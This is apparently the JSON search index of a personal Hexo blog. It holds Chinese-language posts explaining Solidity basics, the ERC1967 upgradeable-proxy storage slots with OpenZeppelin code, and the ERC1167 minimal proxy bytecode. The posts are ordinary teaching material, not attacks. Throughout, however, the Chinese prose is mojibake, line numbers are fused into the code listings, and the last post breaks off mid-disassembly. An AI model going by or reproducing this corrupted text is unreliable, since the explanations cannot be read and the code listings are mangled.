{"meta":{"title":"BY_DLIFEğŸ‰","subtitle":"","description":"Self-Discipline","author":"BY_DLIFEğŸ‰","url":"https://biyouqiuqiu.com","root":"/"},"pages":[{"title":"","date":"2024-04-12T05:59:50.608Z","updated":"2024-04-12T05:59:50.608Z","comments":true,"path":"about/index.html","permalink":"https://biyouqiuqiu.com/about/index.html","excerpt":"","text":"111111"},{"title":"Proxy_article","date":"2023-07-24T01:47:10.000Z","updated":"2023-07-24T01:47:10.000Z","comments":true,"path":"resource/Proxy_article.html","permalink":"https://biyouqiuqiu.com/resource/Proxy_article.html","excerpt":"","text":"1. Chainlink_article"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2023-05-31T23:45:51.441Z","updated":"2023-05-31T23:45:51.441Z","comments":true,"path":"categories/index.html","permalink":"https://biyouqiuqiu.com/categories/index.html","excerpt":"","text":""},{"title":"èµ„æº","date":"2024-04-12T06:05:12.810Z","updated":"2024-04-12T06:05:12.810Z","comments":true,"path":"resource/index.html","permalink":"https://biyouqiuqiu.com/resource/index.html","excerpt":"","text":""}],"posts":[{"title":"solidityæ‰«ç›²","slug":"Basic_Knowledge/solidity/çŸ¥è¯†æ‰«ç›²","date":"2024-02-27T00:47:10.000Z","updated":"2024-02-27T00:47:10.000Z","comments":true,"path":"2024/02/27/Basic_Knowledge/solidity/çŸ¥è¯†æ‰«ç›²/","link":"","permalink":"https://biyouqiuqiu.com/2024/02/27/Basic_Knowledge/solidity/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/","excerpt":"","text":"1. è‡ªå®šä¹‰é”™è¯¯ç±»å‹è¿™æ˜¯åœ¨solidity 0.8.4æ–°åŠ çš„å†…å®¹ï¼Œæ–¹ä¾¿ä¸”é«˜æ•ˆï¼ˆçœgasï¼‰åœ°å‘ç”¨æˆ·è§£é‡Šæ“ä½œå¤±è´¥çš„åŸå› ï¼ŒåŒæ—¶è¿˜å¯ä»¥åœ¨æŠ›å‡ºå¼‚å¸¸çš„åŒæ—¶æºå¸¦å‚æ•°ï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°è°ƒè¯•ã€‚ åœ¨æ‰§è¡Œä¸­ï¼Œerrorå¿…é¡»æ­é…revertä½¿ç”¨ã€‚ è‡ªå®šä¹‰é”™è¯¯ï¼š 1error InsufficientBalance(address requested, uint256 available); ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼š 123456function send1(address payable to, uint256 amount) public &#123; if (address(this).balance &lt; amount) &#123; revert InsufficientBalance(&#123;requested: to, available: amount&#125;); &#125; to.call&#123;value: amount&#125;(&quot;&quot;);&#125; 123456function send2(address payable to, uint256 amount) public &#123; if (address(this).balance &lt; amount) &#123; revert InsufficientBalance(to, amount); &#125; to.call&#123;value: amount&#125;(&quot;&quot;);&#125; 2. è¾…åŠ©å‡½æ•°è¿™æ˜¯ä¸€ç§å®šä¹‰åœ¨åˆçº¦ä¹‹å¤–çš„ä¸€ç§å‡½æ•°ï¼Œæ²¡æœ‰publicï¼Œprivateï¼Œinternalï¼Œexternalè¿™äº›å…³é”®è¯ä¿®é¥°ã€‚è°ƒç”¨çš„æ–¹å¼ä¸ºï¼šç›´æ¥é€šè¿‡å‡½æ•°åè°ƒç”¨å³å¯ã€‚ ç¤ºä¾‹ï¼š 12345678910111213// å®šä¹‰åœ¨åˆçº¦ä¹‹å¤–çš„è¾…åŠ©å‡½æ•°function helper(uint x) pure returns (uint) &#123; return x * 2;&#125;contract Test &#123; uint256 public a = 1; function test() public &#123; a = helper(a) &lt;&lt; 3; &#125;&#125; è°ƒç”¨ä¸€æ¬¡test()å‡½æ•°ä¹‹åï¼Œaçš„å€¼åº”è¯¥å˜æˆ16ã€‚ 3. uintå’Œbytesçš„æˆªå–æ–¹å¼ä»¥è½¬addressç±»å‹ä¸ºä¾‹ï¼š å¦‚æœä½¿ç”¨è¾ƒå¤§å­—èŠ‚çš„ç±»å‹è½¬æ¢ä¸º addressï¼Œä¾‹å¦‚ bytes32ï¼Œé‚£ä¹ˆ address å°±è¢«æˆªæ–­äº†ã€‚ ä¸ºäº†å‡å°‘è½¬æ¢çš„æ¨¡ç³Šæ€§ï¼Œä» 0.4.24 ç‰ˆæœ¬å¼€å§‹ï¼Œç¼–è¯‘å™¨å°†å¼ºè¿«åœ¨è½¬æ¢ä¸­æ˜ç¡®åœ°è¿›è¡Œæˆªæ–­å¤„ç†ã€‚ä»¥32å­—èŠ‚çš„å€¼ 0x111122333344556677888899AAAABBBBCCCCDDDDEEFFFFCCCC ä¸ºä¾‹ã€‚ å¯ä»¥ä½¿ç”¨ address(uint160(bytes20(b)))ï¼Œç»“æœæ˜¯ 0x111122223333444455556666777788889999aAaaï¼Œ æˆ–è€…å¯ä»¥ä½¿ç”¨ address(uint160(uint256(b)))ï¼Œç»“æœæ˜¯ 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCcã€‚ 4. åˆ†æ¸…callersolidityå®˜æ–¹æ–‡æ¡£ä¸Šï¼Œæœ‰è¿™æ ·ä¸€æ®µè¯ï¼š æ‰€æœ‰è¿™äº›å‡½æ•°éƒ½æ˜¯ä½çº§åˆ«çš„å‡½æ•°ï¼Œåº”è¯¥è°¨æ…ä½¿ç”¨ã€‚ å…·ä½“æ¥è¯´ï¼Œä»»ä½•æœªçŸ¥çš„åˆçº¦éƒ½å¯èƒ½æ˜¯æ¶æ„çš„ï¼Œå¦‚æœæ‚¨è°ƒç”¨å®ƒï¼Œ æ‚¨å°±æŠŠæ§åˆ¶æƒäº¤ç»™äº†è¯¥åˆçº¦ï¼Œè€Œè¯¥åˆçº¦åˆå¯èƒ½å›è°ƒåˆ°æ‚¨çš„åˆçº¦ä¸­ï¼Œ æ‰€ä»¥è¦å‡†å¤‡å¥½åœ¨è°ƒç”¨è¿”å›æ—¶æ”¹å˜æ‚¨åˆçº¦çš„çŠ¶æ€å˜é‡ã€‚ ä¸å…¶ä»–åˆçº¦äº’åŠ¨çš„å¸¸è§„æ–¹æ³•æ˜¯åœ¨åˆçº¦å¯¹è±¡ä¸Šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼ˆ x.f()ï¼‰ã€‚ ä¸¾ä¾‹ï¼š 1234567891011121314151617181920212223242526272829contract DistinguishCaller &#123; // è¯¥è°ƒç”¨æ–¹å¼çš„caller, ä¸ºmsg.sender function callCommon() public &#123; callFunc(); &#125; // è¯¥è°ƒç”¨æ–¹å¼çš„caller, ä¸ºaddress(this) function callLow() public &#123; bytes memory paylaod = abi.encodeWithSelector(this.callFunc.selector); (bool ok, ) = address(this).call(paylaod); require(ok); &#125; // è¯¥è°ƒç”¨æ–¹å¼çš„caller, ä¸ºaddress(this) function callThis() public &#123; this.callFunc(); &#125; function callFunc() public &#123; address caller = msg.sender; console.log(&quot;call=&gt;&quot;, caller); &#125;&#125; 5. ä½ç‰ˆæœ¬å‘é€gaså’Œvalue1234// è°ƒç”¨å¤–éƒ¨åˆçº¦å‡½æ•°// è¿™é‡Œä¸€å®šéœ€è¦å¸¦ä¸¤ä¸ªå°æ‹¬å·ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·å¡«æ•°å€¼ï¼Œç¬¬äºŒä¸ªkcontract.function.gas()();contract.function.value()();","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"çŸ¥è¯†æ‰«ç›²","slug":"çŸ¥è¯†æ‰«ç›²","permalink":"https://biyouqiuqiu.com/tags/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/"}]},{"title":"ERC1967","slug":"DEFI/ERC/ERC1967","date":"2024-01-26T04:00:00.000Z","updated":"2024-01-26T04:00:00.000Z","comments":true,"path":"2024/01/26/DEFI/ERC/ERC1967/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/26/DEFI/ERC/ERC1967/","excerpt":"","text":"1. ERC1967ç®€ä»‹ è¯¥ EIPæ ‡å‡†å®šä¹‰äº†ä¸€äº›å­˜å‚¨æ’æ§½ï¼Œç”¨äºå­˜å‚¨ä»£ç†åˆçº¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬é€»è¾‘åˆçº¦åœ°å€ã€ä¿¡æ ‡åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€ã€‚è¿™äº›æ’æ§½çš„ä½¿ç”¨æ ‡å‡†æœ‰åŠ©äºç›‘æ§ä»£ç†çš„å®‰å…¨æ€§ï¼ŒåŒæ—¶é¿å…äº†ä»£ç†å’Œé€»è¾‘åˆçº¦ä¹‹é—´å­˜å‚¨ä½¿ç”¨çš„å†²çªã€‚ ä»£ç†åˆçº¦ç‰¹åˆ«éœ€è¦æ³¨æ„æ’æ§½å†²çªè¿™ä¸ªé—®é¢˜ï¼Œè€Œè¯¥æ ‡å‡†å°±æ˜¯æƒ³åŠæ³•è§£å†³æ’æ§½å†²çªé—®é¢˜ï¼Œå®ƒå°†åˆçº¦åœ°å€ã€ä¿¡æ ‡åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€åˆ†åˆ«å­˜æ”¾åˆ°æŒ‡å®šä½ç½®å­˜å‚¨ä½ç½®ä¸Šï¼ˆæ¯”è¾ƒå¾€åé ï¼‰ï¼Œè€Œå°†ä½ç«¯çš„å­˜å‚¨ï¼ˆæ¯”å¦‚slot0ï¼Œslot1â€¦è¿™äº›é å‰çš„ï¼‰ä½ç½®è®©å‡ºæ¥ç”¨æ¥å­˜æ”¾é€»è¾‘åˆçº¦æ‰€éœ€è¦çš„â€œåŠ è½½æ•°æ®â€ï¼ˆæ¯”å¦‚å˜é‡å•¥çš„ï¼‰ã€‚ 2. åŸç†è§£é‡Šä»£ç æ¥æºäºï¼šå®˜æ–¹æ–‡æ¡£ã€‚ 2.1 ERC1967Upgrade123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/** * @dev This abstract contract provides getters and event emitting update functions for * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots. */abstract contract ERC1967Upgrade &#123; // This is the keccak-256 hash of &quot;eip1967.proxy.rollback&quot; subtracted by 1 bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143; /** * @dev Storage slot with the address of the current implementation. * This is the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1, and is * validated in the constructor. */ bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; /** * @dev Emitted when the implementation is upgraded. */ event Upgraded(address indexed implementation); /** * @dev Returns the current implementation address. */ function _getImplementation() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value; &#125; /** * @dev Stores a new address in the EIP1967 implementation slot. */ function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation; &#125; /** * @dev Perform implementation upgrade * * Emits an &#123;Upgraded&#125; event. */ function _upgradeTo(address newImplementation) internal &#123; _setImplementation(newImplementation); emit Upgraded(newImplementation); &#125; /** * @dev Perform implementation upgrade with additional setup call. * * Emits an &#123;Upgraded&#125; event. */ function _upgradeToAndCall( address newImplementation, bytes memory data, bool forceCall ) internal &#123; _upgradeTo(newImplementation); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(newImplementation, data); &#125; &#125; /** * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. * * Emits an &#123;Upgraded&#125; event. */ function _upgradeToAndCallSecure( address newImplementation, bytes memory data, bool forceCall ) internal &#123; address oldImplementation = _getImplementation(); // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(newImplementation, data); &#125; // Perform rollback test if not already in progress StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT); if (!rollbackTesting.value) &#123; // Trigger rollback using upgradeTo from the new implementation rollbackTesting.value = true; Address.functionDelegateCall( newImplementation, abi.encodeWithSignature(&quot;upgradeTo(address)&quot;, oldImplementation) ); rollbackTesting.value = false; // Check rollback was effective require(oldImplementation == _getImplementation(), &quot;ERC1967Upgrade: upgrade breaks further upgrades&quot;); // Finally reset to the new implementation and log the upgrade _upgradeTo(newImplementation); &#125; &#125; /** * @dev Storage slot with the admin of the contract. * This is the keccak-256 hash of &quot;eip1967.proxy.admin&quot; subtracted by 1, and is * validated in the constructor. */ bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103; /** * @dev Emitted when the admin account has changed. */ event AdminChanged(address previousAdmin, address newAdmin); /** * @dev Returns the current admin. */ function _getAdmin() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_ADMIN_SLOT).value; &#125; /** * @dev Stores a new address in the EIP1967 admin slot. */ function _setAdmin(address newAdmin) private &#123; require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;); StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin; &#125; /** * @dev Changes the admin of the proxy. * * Emits an &#123;AdminChanged&#125; event. */ function _changeAdmin(address newAdmin) internal &#123; emit AdminChanged(_getAdmin(), newAdmin); _setAdmin(newAdmin); &#125; /** * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy. * This is bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) and is validated in the constructor. */ bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50; /** * @dev Emitted when the beacon is upgraded. */ event BeaconUpgraded(address indexed beacon); /** * @dev Returns the current beacon. */ function _getBeacon() internal view returns (address) &#123; return StorageSlot.getAddressSlot(_BEACON_SLOT).value; &#125; /** * @dev Stores a new beacon in the EIP1967 beacon slot. */ function _setBeacon(address newBeacon) private &#123; require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;); require( Address.isContract(IBeacon(newBeacon).implementation()), &quot;ERC1967: beacon implementation is not a contract&quot; ); StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon; &#125; /** * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does * not upgrade the implementation contained in the beacon (see &#123;UpgradeableBeacon-_setImplementation&#125; for that). * * Emits a &#123;BeaconUpgraded&#125; event. */ function _upgradeBeaconToAndCall( address newBeacon, bytes memory data, bool forceCall ) internal &#123; _setBeacon(newBeacon); emit BeaconUpgraded(newBeacon); if (data.length &gt; 0 || forceCall) &#123; Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data); &#125; &#125;&#125; ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé€»è¾‘åˆçº¦åœ°å€ã€ä¿¡æ ‡åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€å­˜å‚¨çš„æ’æ§½ä½äºï¼š 123keccak256(abi.encodePacked(&quot;eip1967.proxy.implementation&quot;)); keccak256(abi.encodePacked(&quot;eip1967.proxy.beacon&quot;));keccak256(abi.encodePacked(&quot;eip1967.proxy.admin&quot;)); è¿™äº›hashå€¼çš„æ•°å€¼éƒ½æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œè¦æ˜¯æŒ‰ç…§å˜é‡ä» slot0, slot1....è¿™æ ·æ…¢æ…¢å­˜å‚¨æ•°æ®åˆ°è¿™å‡ ä¸ªç‰¹æ®Šçš„ä½ç½®ï¼Œé‚£å‡ ä¹æ˜¯ä¸å¯èƒ½çš„å› ä¸ºï¼Œå› ä¸ºé‚£ä¹ˆå¤šçš„å˜é‡ä¼šä½¿å¾—åˆçº¦çš„sizeä¼šå¾ˆå¤§ï¼Œä»è€Œæ— æ³•éƒ¨ç½²åˆçº¦ã€‚ ERC1967Upgradeåˆçº¦ä¸­ï¼Œå¯ä»¥çœ‹åˆ°_IMPLEMENTATION_SLOTæ˜¯å¯è§ç±»å‹æ˜¯internalçš„ï¼Œç”¨äºç»§æ‰¿ã€‚ _getImplementationæ˜¯internalçš„ç”¨äºç»§æ‰¿ï¼Œç”¨æ¥è·å–é€»è¾‘åˆçº¦åœ°å€ï¼›_setImplementationåˆ™æ˜¯ç»™ä¸‹ä¸€ä¸ªå‡½æ•°_upgradeToæ¥è°ƒç”¨çš„ï¼Œç”¨äºè®¾å®šæ–°çš„é€»è¾‘åˆçº¦åœ°å€ã€‚ è¿™ä¸¤ä¸ªæ“ä½œéƒ½ä½¿ç”¨äº†StorageSlotè¿™ä¸ªlibraryï¼Œåœ¨åˆçº¦ä¸‹æ–¹ç»™å‡ºäº†library StorageSlotè¿™ä¸ªåº“çš„ä»£ç ï¼Œå…¶å®šä¹‰äº†å››ç§solotç±»å‹å¹¶ä¸”å†™äº†å¯¹åº”çš„getteræ–¹æ³•ã€‚ _upgradeToå³ç”¨æ¥åšåˆçº¦å‡çº§ï¼Œä¸»è¦å°±æ˜¯è®¾ç½®äº†æ–°çš„é€»è¾‘åˆçº¦åœ°å€ï¼Œå‘å¸ƒäº†Upgradeçš„äº‹ä»¶ï¼› _upgradeToAndCallé¡¾åæ€ä¹‰ï¼Œå³å…ˆåšåˆçº¦å‡çº§ï¼Œå†åšdelegatecallä¼ å…¥çš„bytesç±»å‹çš„dataï¼› _upgradeToAndCallSecureè¿™ä¸ªæ–¹æ³•é¦–å…ˆæ˜¯ç»™UUPSUpgradeableåˆçº¦ç”¨çš„ï¼Œåœ¨open zeppelinçš„githubä»“åº“ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯_upgradeToAndCallUUPS: 12345678910111213141516171819function _upgradeToAndCallUUPS( address newImplementation, bytes memory data, bool forceCall) internal &#123; // Upgrades from old implementations will perform a rollback test. This test requires the new // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing // this special case will break upgrade paths from old UUPS implementation to new ones. if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123; _setImplementation(newImplementation); &#125; else &#123; try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123; require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;); &#125; catch &#123; revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;); &#125; _upgradeToAndCall(newImplementation, data, forceCall); &#125;&#125; _getAdminã€_setAdminã€_changeAdminä¸‰ä¸ªæ–¹æ³•åˆ™æ˜¯ç®¡ç†å‘˜ç›¸å…³ä¿¡æ¯ï¼›_getBeaconã€_setBeaconã€_changeBeaconä¸‰ä¸ªæ–¹æ³•åˆ™æ˜¯ç»™Beaconåˆçº¦ç”¨çš„ï¼› 2.2 Proxy1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071abstract contract Proxy &#123; /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internal call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual &#123; assembly &#123; // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don&#x27;t know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; /** * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function * and &#123;_fallback&#125; should delegate. */ function _implementation() internal view virtual returns (address); /** * @dev Delegates the current call to the address returned by `_implementation()`. * * This function does not return to its internal call site, it will return directly to the external caller. */ function _fallback() internal virtual &#123; _beforeFallback(); _delegate(_implementation()); &#125; /** * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other * function in the contract matches the call data. */ fallback() external payable virtual &#123; _fallback(); &#125; /** * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data * is empty. */ receive() external payable virtual &#123; _fallback(); &#125; /** * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback` * call, or as part of the Solidity `fallback` or `receive` functions. * * If overridden should call `super._beforeFallback()`. */ function _beforeFallback() internal virtual &#123;&#125;&#125; è¿™æ˜¯ä¸€ä¸ªå¯¹é€»è¾‘åˆçº¦æ‰§è¡Œdelegatecallè°ƒç”¨çš„åˆçº¦ï¼Œé€šè¿‡å›è°ƒå‡½æ•°æ‰§è¡Œ ä»£ç†è°ƒç”¨ã€‚å¦‚æœä»£ç†è°ƒç”¨æœ‰è¿”å›å€¼ï¼Œå¯ä»¥è¿”å›æ‰§è¡Œç»“æœçš„è¿”å›å€¼ã€‚ 2.3 ERC1967Proxy12345678910111213141516171819202122232425/** * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an * implementation address that can be changed. This address is stored in storage in the location specified by * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn&#x27;t conflict with the storage layout of the * implementation behind the proxy. */contract ERC1967Proxy is Proxy, ERC1967Upgrade &#123; /** * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`. * * If `_data` is nonempty, it&#x27;s used as data in a delegate call to `_logic`. This will typically be an encoded * function call, and allows initializing the storage of the proxy like a Solidity constructor. */ constructor(address _logic, bytes memory _data) payable &#123; assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(&quot;eip1967.proxy.implementation&quot;)) - 1)); _upgradeToAndCall(_logic, _data, false); &#125; /** * @dev Returns the current implementation address. */ function _implementation() internal view virtual override returns (address impl) &#123; return ERC1967Upgrade._getImplementation(); &#125;&#125; ERC1967Proxyç»§æ‰¿äº†Proxyå’ŒERC1967Upgradeã€‚ æ„é€ å‡½æ•°ä¸­ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œ_logicå³æ˜¯é€»è¾‘åˆçº¦çš„åœ°å€ï¼Œdataæ˜¯ecodeçš„ä»£ç bytesï¼Œå¦‚æœä¸ä¸ºç©ºçš„è¯ï¼Œå¯ç”¨äº_logicçš„delegatecallã€‚æ„é€ å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ˜¯åšäº†æ–­è¨€ï¼Œç¡®ä¿åŸºç±»åˆçº¦ERC1967Upgradeä¸­çš„_IMPLEMENTATION_SLOTå¸¸é‡ä¸º**the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1**ï¼›ç„¶åå°±æ˜¯æ‰§è¡Œäº†_upgradeToAndCallâ€”â€”è¿™ä¸ªå‡½æ•°åŒæ ·æ¥è‡ªäºåŸºç±»åˆçº¦ERC1967Upgradeï¼Œå°±æ˜¯ç”¨äº_logicçš„delegatecallï¼Œå¯å®Œæˆåˆå§‹åŒ–æ“ä½œã€‚ _implementationå‡½æ•°å°±æ˜¯è·å–åˆ°é€»è¾‘åˆçº¦çš„åœ°å€ï¼Œé€»è¾‘åˆçº¦çš„åœ°å€è—åœ¨æŸä¸ªå¾ˆå¤§çš„æ•°å€¼ç´¢å¼•_IMPLEMENTATION_SLOTæŒ‡å‘çš„storageå†…å­˜ä¸­ã€‚ 3. å®‰å…¨éšæ‚£é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ—¢ç„¶éƒ½çŸ¥é“ implementation.slotçš„å­˜å‚¨ä½ç½®åœ¨å“ªäº†ï¼Œé‚£ä¹ˆå²‚ä¸æ˜¯å¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„æŸäº›æ“ä½œä»è€Œè¦†ç›–æ‰ä»£ç†åˆçº¦çš„é€»è¾‘åˆçº¦åœ°å€ã€‚ ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯éœ€è¦æ³¨æ„çš„ï¼Œçœ‹çœ‹é€»è¾‘åˆçº¦ä¸­æ˜¯å¦å­˜åœ¨æ‰§è¡Œæ“ä½œçš„ä»£ç ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1967","slug":"ERC1967","permalink":"https://biyouqiuqiu.com/tags/ERC1967/"}]},{"title":"ERC1167","slug":"DEFI/ERC/ERC1167","date":"2024-01-25T04:00:00.000Z","updated":"2024-01-25T04:00:00.000Z","comments":true,"path":"2024/01/25/DEFI/ERC/ERC1167/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/25/DEFI/ERC/ERC1167/","excerpt":"","text":"1. ERC1167 ç®€ä»‹ EIP-1167ï¼Œåˆç§°Minimal Proxy Contractï¼Œæä¾›äº†ä¸€ç§ä½æˆæœ¬å¤åˆ¶åˆçº¦çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å«ä½œæ˜¯å…‹éš†åˆçº¦çš„æ–¹æ³•ã€‚å¦‚ä½•ç†è§£å…‹éš†å‘¢ï¼Ÿå…‹éš†å°±æ˜¯ç±»ä¼¼å¤åˆ¶çš„æ„æ€ï¼Œè¿™é‡Œçš„åˆçº¦å…‹éš†æ˜¯æŒ‡ï¼šå…‹éš†åˆçº¦å’ŒåŸåˆçº¦å…·æœ‰ç›¸åŒçš„é€»è¾‘åŠŸèƒ½ã€‚è€Œä¸”åˆ›å»ºå…‹éš†åˆçº¦çš„æˆæœ¬æ¯”ç›´æ¥éƒ¨ç½²åŸåˆçº¦ä½ï¼Œéƒ¨ç½²å…‹éš†åˆçº¦çš„å‰ææ˜¯å¾—æœ‰ä¸€ä¸ªåŸä»¶ã€‚ 2. åŸç†å¤ç°2.1 å·¥ä½œåŸç†ä¸€è¯´åˆ°ä»£ç†ï¼Œé¦–å…ˆå°±ä¼šæƒ³åˆ°ä»£ç†åˆçº¦ï¼Œåˆçº¦å‡çº§ã€‚ä½†æ˜¯ERC1167ä¸æ˜¯åˆçº¦å‡çº§ï¼Œå®ƒåªæ˜¯è´Ÿè´£åˆçº¦çš„è°ƒç”¨è½¬å‘ã€‚ å¯å‡çº§åˆçº¦çš„ä»£ç†åˆçº¦æ¶æ„ï¼š æ•´ä¸ªæ¶æ„ä¸­å­˜åœ¨ä¸€ä¸ªä»£ç†åˆçº¦å’Œå¤šä¸ªé€»è¾‘åˆçº¦ï¼Œåªæœ‰ä¸€å¥—æ•°æ®ï¼ˆå³ä»£ç†åˆçº¦çš„æ•°æ®ï¼‰ï¼Œéœ€è¦å‡çº§æ—¶åˆ™æ›¿æ¢æ‰ä»£ç†åˆçº¦ä¸­çš„é€»è¾‘åˆçº¦ï¼Œè€Œä¸”åŒä¸€æ—¶é—´åªèƒ½å­˜åœ¨ä¸€ä¸ªé€»è¾‘åˆçº¦ã€‚ Minimal Proxy Contractåˆçº¦æ¶æ„ï¼š æ•´ä¸ªæ¶æ„ä¸­å­˜åœ¨å¤šä¸ªä»£ç†åˆçº¦å’Œä¸€ä¸ªé€»è¾‘åˆçº¦ï¼Œæœ‰å¤šå¥—æ•°æ®åˆ†åˆ«å­˜å‚¨åœ¨ä¸åŒçš„ä»£ç†åˆçº¦ä¸­ï¼Œæ‰€æœ‰ä»£ç†åˆçº¦å…±äº«é€»è¾‘åˆçº¦çš„æ‰§è¡Œé€»è¾‘ï¼ŒåŒä¸€æ—¶é—´å­˜åœ¨å¤šä¸ªä»£ç†åˆçº¦ã€‚Minimal Proxy Contractçš„åŸç†å°±æ˜¯å°†ä»£ç†åˆçº¦ä½œä¸ºé€»è¾‘åˆçº¦çš„å¤åˆ¶å“ï¼Œå„ä¸ªä»£ç†åˆçº¦å­˜å‚¨å„è‡ªçš„æ•°æ®ï¼Œéœ€è¦å¤šå°‘ä»½å¤åˆ¶å“å°±åˆ›å»ºå¤šå°‘ä¸ªä»£ç†åˆçº¦ã€‚è€Œä»£ç†åˆçº¦æœ¬èº«åªè´Ÿè´£è¯·æ±‚è½¬å‘ï¼Œå› æ­¤å…¶å†…å®¹å¾ˆå°‘ï¼Œä»è€Œè€—è´¹çš„gaså°±æ›´å°‘ã€‚ 2.2 è§£æå­—èŠ‚ç ä»å®˜æ–¹æ–‡æ¡£ä¸Šå¯ä»¥çœ‹åˆ°è¿™ä¸²å­—èŠ‚ç ï¼š 363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3ï¼Œç»è¿‡åç¼–è¯‘ä¹‹åï¼š 123456789101112131415161718192021222324 0x0: CALLDATASIZE 0x1: RETURNDATASIZE 0x2: RETURNDATASIZE 0x3: CALLDATACOPY 0x4: RETURNDATASIZE 0x5: RETURNDATASIZE 0x6: RETURNDATASIZE 0x7: CALLDATASIZE 0x8: RETURNDATASIZE 0x9: PUSH20 0xbebebebebebebebebebebebebebebebebebebebe0x1e: GAS 0x1f: DELEGATECALL0x20: RETURNDATASIZE0x21: DUP3 0x22: DUP1 0x23: RETURNDATACOPY0x24: SWAP1 0x25: RETURNDATASIZE0x26: SWAP2 0x27: PUSH1 0x2b0x29: JUMPI 0x2a: REVERT 0x2b: JUMPDEST 